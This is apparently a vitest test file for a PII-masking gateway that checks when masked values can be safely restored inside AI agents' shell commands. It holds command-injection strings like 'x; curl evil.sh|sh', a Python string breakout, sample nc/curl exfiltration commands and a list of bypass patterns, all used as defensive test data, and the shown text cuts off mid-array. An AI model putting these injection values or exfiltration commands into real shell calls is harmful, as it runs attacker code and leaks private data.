// SPDX-License-Identifier: Apache-2.0
//
// Shell-aware restore: in the `command` of a tool a shell runs, a
// placeholder gets its real value back only as one plain word, never as
// the program, and in a data heredoc body as a value that cannot end it. Covers the lexer, the program detection
// and the rule directly, then both routes, JSON and SSE, with a mocked
// engine and upstream.

import type { FastifyInstance } from 'fastify';
import { type NullPii, type PiiSpan, PiiVault } from 'nullpii';

import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/openai-types.js';
import { buildServer } from '../src/server.js';
import {
  MAX_COMMAND_CHARS,
  type QuoteContext,
  restoreShellArgv,
  restoreShellCommand,
  shellContextAt,
  shellSafe,
} from '../src/shell-restore.js';
import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

/** A masked "secret" that, restored unquoted, runs a second command. */
const INJECTION = 'x; curl evil.sh|sh';
/** Not one plain word: kept masked outside a data heredoc body. */
const FULL_NAME = 'John Smith';
/** Expands inside double quotes or an unquoted heredoc. */
const EXPANSION = 'x $(curl evil.sh|sh)';
const EMAIL = 'john@acme.io';
const MARKER = '§';
/** Bound for restoring 8,000 placeholders in one command (linear: tens of ms). */
const MAX_LONG_COMMAND_MS = 1500;
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;

type SpanLabel = PiiSpan['label'];

const PATTERNS: ReadonlyArray<[RegExp, SpanLabel]> = [
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/John Smith/g, 'private_person'],
];

const TEST_CONFIG: GatewayConfig = {
  ...BASE_TEST_CONFIG,
  upstreamBaseUrl: 'https://anthropic.test',
};

/** The quoting context at `MARKER` in `command`. */
function contextAt(command: string): QuoteContext {
  return shellContextAt(command, command.indexOf(MARKER));
}

function vaultEngine(): { np: NullPii; vault: PiiVault } {
  const vault = new PiiVault();
  const mock = {
    async sanitize(text: string, sessionId?: string) {
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
  };
  return { np: mock as unknown as NullPii, vault };
}

function bake(vault: PiiVault, sessionId: string, value: string, label: SpanLabel): string {
  const span = { label, start: 0, end: value.length, text: value, score: 1 };
  return vault.sanitize(value, [span], sessionId).sanitized;
}

/** The distinct `[secret, person]` placeholders, in order of first use, of
 * the user message every route test sends or of a command built from it. */
const USER_TEXT = `Run ${INJECTION} for ${FULL_NAME}`;

function placeholdersIn(text: unknown): [string, string] {
  const found = typeof text === 'string' ? (text.match(PLACEHOLDER) ?? []) : [];
  const [secret, person] = new Set(found);
  if (secret === undefined || person === undefined) throw new Error('expected two placeholders');
  return [secret, person];
}

/** A Claude Code-style commit: the message is a quoted heredoc. */
function commitWith(message: string): string {
  return `git commit -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
}

/** One command using each placeholder unquoted, quoted, and in a heredoc. */
function bashCommand(secret: string, person: string): string {
  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitWith(`Thanks ${person}`)}`;
}

/** What the client must receive: real values only where they are safe.
 * Neither value is one plain word, so both stay masked, quoted or not;
 * the commit message, a data heredoc body, gets the name back. */
function expectedCommand(secret: string, person: string): string {
  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

async function serve(
  respond: (body: string) => Response,
  extra: { logStream?: { write(line: string): void }; logLevel?: GatewayConfig['logLevel'] } = {},
) {
  const { np } = vaultEngine();
  const fetchImpl = async (_url: string, init: RequestInit) => respond(init.body as string);
  const config = {
    ...TEST_CONFIG,
    ...(extra.logLevel !== undefined && { logLevel: extra.logLevel }),
  };
  const app = await buildServer({
    config,
    np,
    fetchImpl,
    ...(extra.logStream !== undefined && { logStream: extra.logStream }),
  });
  apps.push(app);
  return app;
}

function sseResponse(frames: string[]): Response {
  return new Response(frames.join(''), { headers: { 'content-type': 'text/event-stream' } });
}

function anthropicFrame(event: string, data: unknown): string {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function openAiFrame(choices: unknown[]): string {
  return `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', choices })}\n\n`;
}

/** Concatenate a stream's tool-input shards per block (Anthropic) or per
 * tool-call index (OpenAI), as the SDKs do. */
function streamedInputs(body: string): Map<number, string> {
  const out = new Map<number, string>();
  const add = (index: number, shard: unknown): void => {
    if (typeof shard === 'string') out.set(index, (out.get(index) ?? '') + shard);
  };
  for (const frame of body.split('\n\n')) {
    const line = frame.split('\n').find((l) => l.startsWith('data: '));
    if (line === undefined || line === 'data: [DONE]') continue;
    const data = JSON.parse(line.slice('data: '.length)) as {
      index?: number;
      delta?: { partial_json?: string };
      choices?: Array<{
        delta?: { tool_calls?: Array<{ index: number; function?: { arguments?: string } }> };
      }>;
    };
    if (typeof data.index === 'number') add(data.index, data.delta?.partial_json);
    for (const call of data.choices?.[0]?.delta?.tool_calls ?? []) {
      add(call.index, call.function?.arguments);
    }
  }
  return out;
}

describe('shell restore · quoting context', () => {
  it.each<[string, QuoteContext]>([
    [`echo ${MARKER}`, 'none'],
    [`echo '${MARKER}'`, 'single'],
    [`echo "${MARKER}"`, 'double'],
    [`echo \\'${MARKER}`, 'none'],
    [`echo "it's ${MARKER}"`, 'double'],
    [`echo 'a "b' ${MARKER}`, 'none'],
    [`echo "a \\" ${MARKER}"`, 'double'],
    [`echo 'a \\' ${MARKER}`, 'none'],
    // A command substitution is unquoted, even inside double quotes.
    [`echo "$(cat ${MARKER})"`, 'none'],
    [`echo "\`cat ${MARKER}\`"`, 'none'],
    [`echo "$(printf "${MARKER}")"`, 'double'],
    [`echo "$(echo (a)) ${MARKER}"`, 'double'],
    [`echo "$((1 + 2)) ${MARKER}"`, 'double'],
    // Heredoc bodies fed to cat or tee: literal, or expanding when bare.
    [`cat <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<"EOF"\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<\\EOF\n${MARKER}\nEOF`, 'heredoc'],
    [`cat <<-'EOF'\n\t${MARKER}\n\tEOF`, 'heredoc'],
    [`cat <<'EOF' > notes.txt\n${MARKER}\nEOF`, 'heredoc'],
    // `tee` writes where an argument points: not a data command.
    [`tee notes.txt <<'EOF'\n${MARKER}\nEOF`, 'none'],
    [commitWith(`Thanks ${MARKER}`), 'heredoc'],
    [`cat <<EOF\n${MARKER}\nEOF`, 'heredoc-expanding'],
    [`cat <<EOF\n$(echo ${MARKER})\nEOF`, 'none'],
    // A body is not shell code: its apostrophe opens no quote.
    [`cat <<'EOF'\nit's done\nEOF\necho ${MARKER}`, 'none'],
    // Not heredocs: `<<` inside quotes, or the here-string `<<<`.
    [`echo '<<EOF'\n${MARKER}`, 'none'],
    [`cat <<<"x"\n${MARKER}`, 'none'],
    // A body another program may run, one piped on, one never closed.
    [`python3 - <<'EOF'\nprint('${MARKER}')\nEOF`, 'none'],
    [`cat <<'EOF' | grep x\n${MARKER}\nEOF`, 'none'],
    [`cat <<'EOF'\n${MARKER}`, 'none'],
    // Code handed to another interpreter: the strictest rule.
    [`bash -lc "echo ${MARKER}"`, 'none'],
    [`sh -c '${MARKER}'`, 'none'],
    [`eval "echo ${MARKER}"`, 'none'],
    [`ssh host "echo ${MARKER}"`, 'none'],
    [`su -c 'echo ${MARKER}'`, 'none'],
    [`python3 -c 'print("${MARKER}")'`, 'none'],
    [`node -e 'console.log("${MARKER}")'`, 'none'],
    [`echo '${MARKER}' | bash`, 'none'],
    [`awk '{print "${MARKER}"}' data.txt`, 'none'],
    // A `#` comment: a quote in it opens nothing.
    [`# load the user's key\nexport KEY=${MARKER}`, 'none'],
    [`# don't print\necho "t=${MARKER}"`, 'double'],
    [`echo hi # it's done\necho '${MARKER}'`, 'single'],
    [`echo hi; # it's done\necho '${MARKER}'`, 'single'],
    // Not comments: mid-word, `$#`, `${#x}`, inside quotes.
    [`echo a#b '${MARKER}'`, 'single'],
    [`echo $# '${MARKER}'`, 'single'],
    [`echo \${#x} '${MARKER}'`, 'single'],
    [`echo "#" '${MARKER}'`, 'single'],
    // The code flag after other options and their arguments.
    [`bash -o pipefail -c "echo ${MARKER}"`, 'none'],
    [`bash -euo pipefail -c "echo ${MARKER}"`, 'none'],
    [`bash --norc -c "echo ${MARKER}"`, 'none'],
    [`bash -ce "echo ${MARKER}"`, 'none'],
    [`node --eval "console.log('${MARKER}')"`, 'none'],
    [`perl -E "say '${MARKER}'"`, 'none'],
    [`su root -c "echo ${MARKER}"`, 'none'],
    // A heredoc written to a script that the same command runs is code.
    [`cat > run.sh <<'EOF'\necho ${MARKER}\nEOF\nbash run.sh`, 'none'],
    [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\nchmod +x run.sh && ./run.sh`, 'none'],
    [`cat > ./notes.md <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
  ])('%j → %s', (command, context) => {
    expect(contextAt(command)).toBe(context);
  });

  it.each<[string, QuoteContext, boolean]>([
    ['john@acme.io', 'none', true],
    [FULL_NAME, 'none', false],
    [INJECTION, 'none', false],
    // Never inert: quoted, it would still break out of a program that
    // reads the string again (`python3 <<< "…"`, `watch "…"`).
    [INJECTION, 'single', false],
    [INJECTION, 'double', false],
    // Outside a data body only one plain word, whatever the quoting.
    [FULL_NAME, 'single', false],
    ['Nicolò', 'double', true],
    ['Nicolò Rossi', 'double', false],
    ["O'Brien", 'single', false],
    ["O'Brien", 'double', false],
    ['a (b)', 'double', false],
    ['a{b}', 'single', false],
    ['tab\there', 'single', false],
    ['line\u2028break', 'double', false],
    // A word a shell would read as an option, a comment or a home dir.
    ['x --delete', 'double', false],
    ['x #rest', 'single', false],
    ['x ~/y', 'single', false],
    ['Via Roma 1 - Milano', 'double', false],
    ['two\nlines', 'single', false],
    [FULL_NAME, 'double', false],
    ['$HOME', 'double', false],
    ['a"b', 'double', false],
    ['a`id`', 'double', false],
    ['a\\b', 'double', false],
    ['hi!', 'double', false],
    [FULL_NAME, 'heredoc', true],
    [EXPANSION, 'heredoc', true],
    ["O'Brien", 'heredoc', true],
    ['two\nlines', 'heredoc', false],
    ['O\'Brien "Bob"', 'heredoc-expanding', true],
    ['$HOME', 'heredoc-expanding', false],
    ['a`id`', 'heredoc-expanding', false],
    ['a\\b', 'heredoc-expanding', false],
    // A leading dash would read as an option to the command.
    ['-rf', 'none', false],
    ['--output=/tmp/x', 'single', false],
    ['-v', 'double', false],
    ['-- a list item', 'heredoc', true],
    // zsh expands a leading `=` to a program path.
    ['=ls', 'none', false],
    ['a=b', 'none', true],
    ['~root', 'none', false],
    ['mario.rossi@example.com', 'single', true],
  ])('shellSafe(%j, %s) is %s', (value, context, safe) => {
    expect(shellSafe(value, context)).toBe(safe);
  });
});

describe('shell restore · restoreShellCommand', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('keeps a value that is not one plain word masked, quoted or not; restores a plain one', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(
      np,
      `echo ${secret} && echo '${secret}' && echo "${person}" '${person}' ${email}`,
      sessionId,
    );

    expect(r.command).toBe(
      `echo ${secret} && echo '${secret}' && echo "${person}" '${person}' ${EMAIL}`,
    );
    expect(r.keptMasked).toEqual([secret, secret, person, person]);
    expect(r.results.reduce((n, x) => n + x.replacements, 0)).toBe(1);
  });

  it.each([
    ['program', (p: string) => `${p} --help`],
    ['program behind a wrapper', (p: string) => `sudo -u root ${p}`],
    ['program after an assignment', (p: string) => `LANG=C ${p}`],
    ['program after an operator', (p: string) => `true && ${p}`],
    ['program in a substitution', (p: string) => `echo "$(${p})"`],
    ['program named by a path', (p: string) => `./${p}`],
    ['program in a case branch', (p: string) => `case x in a) ${p} ;; esac`],
  ])('keeps a plain word masked as the %s', (_where, build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const r = restoreShellCommand(np, build(email), sessionId);
    expect(r.keptMasked).toEqual([email]);
  });

  it.each([(p: string) => `echo ${p}`, (p: string) => `grep -r ${p} .`])(
    'restores a plain word as an argument: %#',
    (build) => {
      const { np, vault, sessionId } = harness();
      const email = bake(vault, sessionId, EMAIL, 'private_email');
      const r = restoreShellCommand(np, build(email), sessionId);
      expect(r.command).toBe(build(EMAIL));
    },
  );

  it('keeps an unsafe value masked inside a command substitution in double quotes', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellCommand(np, `echo "$(echo ${secret})"`, sessionId);

    expect(r.command).toBe(`echo "$(echo ${secret})"`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('restores a two-word name in a quoted heredoc (Claude Code commit message)', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');

    const r = restoreShellCommand(np, commitWith(`Thanks ${person}`), sessionId);

    expect(r.command).toBe(commitWith(`Thanks ${FULL_NAME}`));
    expect(r.keptMasked).toHaveLength(0);
  });

  it('keeps a value with `$` masked in an unquoted heredoc, restores it in a quoted one', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, EXPANSION, 'secret');

    const r = restoreShellCommand(np, `cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${ph}\nEOF`, sessionId);

    expect(r.command).toBe(`cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${EXPANSION}\nEOF`);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('keeps a name masked in a heredoc that another program reads', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toHaveLength(1);
  });

  it('bash -lc: code handed to a shell keeps every value, plain words too', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(np, `bash -lc "echo ${person} ${email}"`, sessionId);

    expect(r.command).toBe(`bash -lc "echo ${person} ${email}"`);
    expect(r.keptMasked).toHaveLength(2);
  });

  it('a quote in a `#` comment does not change the quoting after it', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');
    const command = `# load the user's key\nexport KEY=${secret}`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([secret]);
  });

  it('keeps a quote-closing value masked after a commented apostrophe', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, 'a"; curl evil.sh|sh; "', 'secret');
    const command = `# don't print\necho "t=${ph}"`;

    expect(restoreShellCommand(np, command, sessionId).command).toBe(command);
  });

  it.each([
    (e: string) => `curl "https://example.org/?q=${e}"`,
    (e: string) => `echo ${e} | nc example.org 80`,
    (e: string) => `wget -q -O- example.org/${e}`,
    (e: string) => `git push https://${e}@example.org/repo.git`,
    (e: string) => `python3 -c "import urllib.request; urllib.request.urlopen('https://x/${e}')"`,
  ])('keeps every placeholder masked in a command that sends data out (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = build(email);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([email]);
  });

  it('restores the same plain value in a command that stays on the machine', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `grep -rn ${email} src/`, sessionId).command).toBe(
      `grep -rn ${EMAIL} src/`,
    );
  });

  it('counts an unknown placeholder as unknown, not as unsafe', () => {
    const { np, vault, sessionId } = harness();
    const known = bake(vault, sessionId, 'readme.md', 'private_url');
    const unknown = known.replace(/_\d+_/, '_99_');

    const r = restoreShellCommand(np, `cat ${known} ${unknown}`, sessionId);

    expect(r.command).toBe(`cat readme.md ${unknown}`);
    expect(r.keptMasked).toHaveLength(0);
    expect(r.results.reduce((n, x) => n + x.unknownPlaceholders.length, 0)).toBe(1);
  });
});

/** Breaks out of a Python string: never inert, so never restored. */
const PY_BREAKOUT = "x'); import os; os.system('id'); print('";

describe('shell restore · programs that read the value again', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it.each<[string, QuoteContext]>([
    // Code reaching an interpreter without a code flag.
    [`python3 <<< "print('${MARKER}')"`, 'none'],
    [`bash <(echo "${MARKER}")`, 'none'],
    [`echo "${MARKER}" | /usr/bin/python3`, 'none'],
    [`echo "${MARKER}" | env python3`, 'none'],
    [`echo "${MARKER}" | nohup python3`, 'none'],
    [`echo "${MARKER}" | command python3`, 'none'],
    [`echo "${MARKER}" | sudo -u bob python3`, 'none'],
    [`echo "${MARKER}" |& python3`, 'none'],
    [`echo "${MARKER}" | timeout 5 node`, 'none'],
    [`echo "${MARKER}" | sudo \\\n  python3`, 'none'],
    [`$PY script.py "${MARKER}"`, 'none'],
    [`sudo -s "echo ${MARKER}"`, 'none'],
    [`env -S "echo ${MARKER}"`, 'none'],
    [`docker run img sh -c "echo ${MARKER}"`, 'none'],
    // Wrappers that run their argument through a shell.
    [`watch "echo ${MARKER}"`, 'none'],
    [`flock /tmp/lock -c "echo ${MARKER}"`, 'none'],
    [`script -qc "echo ${MARKER}" /dev/null`, 'none'],
    [`xargs -I{} echo "${MARKER}" {}`, 'none'],
    // A file written and run by the same command.
    [`echo "${MARKER}" > run.sh; bash run.sh`, 'none'],
    [`cat > Makefile <<'EOF'\n${MARKER}\nEOF\nmake -f Makefile`, 'none'],
    [`cat > run.sh <<'EOF'\n${MARKER}\nEOF\n./run.sh`, 'none'],
    // A data body in a command that also runs something else: the
    // double-quote rule, not the body's own.
    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit add notes.md`, 'heredoc'],
    [`cat > notes.md <<'EOF'\n${MARKER}\nEOF\ngit push`, 'double'],
    [`cd docs && cat > notes.md <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
    // `$'…'` honours backslash escapes; a redirection is not a separator.
    [`echo $'it\\'s' '${MARKER}'`, 'single'],
    [`echo $'a\\'' ${MARKER}`, 'none'],
    [`cat <<'EOF' > notes.md 2>&1\n${MARKER}\nEOF`, 'heredoc'],
  ])('%j → %s', (command, context) => {
    expect(contextAt(command)).toBe(context);
  });

  it.each([
    (p: string) => `python3 <<< "print('${p}')"`,
    (p: string) => `echo "print('${p}')" | /usr/bin/python3`,
    (p: string) => `watch "echo '${p}'"`,
    (p: string) => `echo "print('${p}')" > x.py; python3 x.py`,
  ])('never restores a value that breaks out of the string it lands in (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, PY_BREAKOUT, 'secret');
    const command = build(ph);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([ph]);
  });

  it.each([
    (e: string) => `gh issue create --title "${e}"`,
    (e: string) => `dig ${e}.example.org`,
    (e: string) => `nslookup ${e}.example.org`,
    (e: string) => `ping -c1 ${e}.example.org`,
    (e: string) => `docker push registry.example.org/${e}`,
    (e: string) => `aws s3 cp notes.txt s3://bucket/${e}`,
    (e: string) => `mail -s ${e} admin@example.org < notes.txt`,
    (e: string) => `git clone https://example.org/${e}.git`,
    (e: string) => `git -C repo fetch https://example.org/${e}.git`,
    (e: string) => `echo ${e} | timeout 5 nc example.org 80`,
    (e: string) => `echo ${e} | env X=1 nc example.org 80`,
    (e: string) => `sudo -u bob curl example.org/${e}`,
    (e: string) => `bash -c "echo ${e} | nc example.org 80"`,
  ])('keeps every placeholder masked in a command that sends data out (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = build(email);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(command);
    expect(r.keptMasked).toEqual([email]);
  });

  it.each([
    (e: string) => `grep ${e} ~/.ssh/config`,
    (e: string) => `git commit -m "fetch the list for ${e}"`,
  ])('restores in a local command that only mentions a network word (%#)', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).command).toBe(build(EMAIL));
  });

  it('restores an apostrophe only in a body that a data command writes', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, "Anna D'Amico", 'private_person');
    const body = (n: string) => `cat > notes.md <<'EOF'\nOwner: ${n}\nEOF`;

    expect(restoreShellCommand(np, body(name), sessionId).command).toBe(body("Anna D'Amico"));
    expect(restoreShellCommand(np, commitWith(`Thanks ${name}`), sessionId).command).toBe(
      commitWith("Thanks Anna D'Amico"),
    );
    const thenAdd = (n: string) => `${body(n)}\ngit add notes.md`;
    expect(restoreShellCommand(np, thenAdd(name), sessionId).command).toBe(thenAdd("Anna D'Amico"));
    const thenRun = `${body(name)}\nmake notes`;
    expect(restoreShellCommand(np, thenRun, sessionId).command).toBe(thenRun);
  });

  it('reads a long command once: thousands of placeholders stay fast', () => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, FULL_NAME, 'private_person');
    const rows = Array.from({ length: 4000 }, (_, i) => `${ph},${i}`).join('\n');
    const command = `cat > names.csv <<'EOF'\n${rows}\nEOF`;

    const started = performance.now();
    const r = restoreShellCommand(np, command, sessionId);
    const elapsed = performance.now() - started;

    expect(r.keptMasked).toHaveLength(0);
    expect(r.command.startsWith(`cat > names.csv <<'EOF'\n${FULL_NAME},0\n`)).toBe(true);
    // Reading the command per placeholder took seconds at this size.
    expect(elapsed).toBeLessThan(MAX_LONG_COMMAND_MS);
  });
});

describe('shell restore · v3 hardening', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }
  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
    r.results.reduce((n, x) => n + x.replacements, 0);

  it('a commit message that mentions network tools is still data', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = commitWith(`Thanks ${person}: fix the ssh and curl -X calls, bash -c too`);

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(
      commitWith(`Thanks ${FULL_NAME}: fix the ssh and curl -X calls, bash -c too`),
    );
  });

  it('a substitution in an expanding body is still read for network clients', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `cat > a.txt <<EOF\n$(curl -s example.org) ${email}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `open "https://example.org/?q=${p}"`,
    (p: string) => `python3 -m webbrowser https://example.org/${p}`,
    (p: string) => `grep ${p} https://example.org`,
  ])('a URL handed to a program that is not a data one keeps every value: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(email), sessionId))).toBe(0);
  });

  it('a URL in an echo or a commit message does not stop the restore', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(np, `echo "see https://example.org" ${email}`, sessionId);

    expect(r.command).toBe(`echo "see https://example.org" ${EMAIL}`);
  });

  it.each([
    (p: string) => `sed -i 's/old/${p}/' config.yml`,
    (p: string) => `find . -name '*.yml' -exec gsed -i 's,a,${p},' {} +`,
    (p: string) => `perl -pi -e 's{a}{${p}}' x.txt`,
    (p: string) => `bash -c "sed s/a/${p}/ x"`,
  ])('sed or perl in the command keeps every value, plain words too: %#', (build) => {
    const { np, vault, sessionId } = harness();
    // `x/e` closes a sed replacement and adds the flag that runs it.
    const word = bake(vault, sessionId, 'x/e', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `echo hi > ${p}`,
    (p: string) => `cat notes.txt >> ${p}`,
    (p: string) => `sudo -u root echo ${p}`,
    (p: string) => `ssh-keygen -t ed25519 -C ${p}`,
    (p: string) => `rm -rf ${p}`,
    (p: string) => `cp a.txt ${p}`,
    (p: string) => `some-unknown-tool ${p}`,
  ])('restores nothing outside the allowlist or into a redirection target: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
  });

  it.each([
    (p: string) => `fd . -x ${p}`,
    (p: string) => `rg --hostname-bin=${p} x`,
    (p: string) => `git grep -O${p} foo`,
    (p: string) => `find . -name ${p} -delete`,
    (p: string) => `find . -fprint ${p}`,
    (p: string) => `sort a.txt -o ${p}`,
    (p: string) => `git diff --output=${p}`,
    (p: string) => `uniq a.txt ${p}`,
    (p: string) => `printf -v ${p} '%s' x`,
    (p: string) => `printf -v PATH '%s' ${p}`,
    (p: string) => `file -C -m ${p}`,
    (p: string) => `tee notes.md <<'EOF'\n${p}\nEOF`,
    (p: string) => `echo "$(${':;'.repeat(70)})" B=${p}`,
  ])('restores nothing where a listed program would run or write by an option: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
  });

  it.each([
    (p: string) => `grep ${p} /etc/hosts 2>/dev/null`,
    (p: string) => `cat /etc/hosts | grep ${p}`,
    (p: string) => `git log --grep user=${p}`,
  ])('restores into read-only commands the earlier heuristics refused: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).command).toBe(build(EMAIL));
  });

  it('reading a file under /etc does not count as writing one', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `grep ${email} /etc/hosts`, sessionId).command).toBe(
      `grep ${EMAIL} /etc/hosts`,
    );
  });

  it('a file named after sed is not sed', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `cat sed.txt ${email}`, sessionId).command).toBe(
      `cat sed.txt ${EMAIL}`,
    );
  });

  it('a heredoc delimiter must be a whole word', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    // `EOF.txt` is the delimiter here, so the `EOF` line does not end it.
    const command = `cat > a.txt <<EOF.txt\n${person}\nEOF\nrm -rf x\nEOF.txt`;

    expect(restoreShellCommand(np, command, sessionId).keptMasked).toEqual([person]);
  });

  it('a command left with an open quote or substitution loses the heredoc exception', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > a.txt <<'EOF'\n${person}\nEOF\necho "unterminated`;

    expect(restoreShellCommand(np, command, sessionId).keptMasked).toEqual([person]);
  });

  it('a command over the length budget keeps every placeholder', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `echo ${email} ${'x'.repeat(MAX_COMMAND_CHARS)}`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it.each([
    ['many heredoc operators on one line', (n: number) => 'cat <<A '.repeat(n)],
    ['nested substitutions', (n: number) => `${'echo $('.repeat(n)}x${')'.repeat(n)}`],
    ['many short commands', (n: number) => 'a;'.repeat(n * 4)],
  ])('reads %s in linear time', (_what, build) => {
    const { np, sessionId } = harness();
    const time = (n: number) => {
      const command = build(n);
      const started = performance.now();
      restoreShellCommand(np, command, sessionId);
      return performance.now() - started;
    };
    time(1000);
    const small = Math.max(time(4000), 1);
    const large = time(16000);
    // Four times the input: well under the sixteen times a quadratic pass takes.
    expect(large / small).toBeLessThan(10);
  });
});

describe('shell restore · round-5 bypasses', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }
  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
    r.results.reduce((n, x) => n + x.replacements, 0);

  it.each([
    (p: string) => `bash -c "${p} file.txt"`,
    (p: string) => `sh -c '${p}'`,
    (p: string) => `eval ${p}`,
    (p: string) => `echo ${p} | sh`,
    (p: string) => `printf %s ${p} | bash`,
    (p: string) => `cat <<EOF | bash\n${p}\nEOF`,
    (p: string) => `python3 -c "import os; os.system('${p}')"`,
    (p: string) => `watch ${p}`,
    (p: string) => `trap ${p} EXIT`,
    (p: string) => `find . -exec ${p} {} +`,
    (p: string) => `x=${p}; $x`,
    (p: string) => `for c in ${p}; do $c; done`,
    (p: string) => `bash ${p}`,
    (p: string) => `source ${p}`,
    (p: string) => `deno run ${p}`,
    (p: string) => `PAGER=${p} git log`,
